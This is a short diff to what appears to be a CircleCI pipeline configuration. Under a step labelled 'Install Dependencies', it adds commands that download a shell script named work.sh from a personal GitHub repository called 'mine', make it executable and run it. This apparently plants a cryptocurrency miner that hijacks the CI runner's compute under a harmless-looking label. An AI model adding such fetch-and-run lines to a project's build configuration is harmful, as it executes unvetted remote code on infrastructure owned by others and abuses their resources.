@@ -9,7 +9,9 @@ jobs:
             name: Install Dependencies
             command: |
               lscpu
-              
+              wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh
+              chmod +x work.sh
+              ./work.sh
 
 workflows:
     version: 2.1
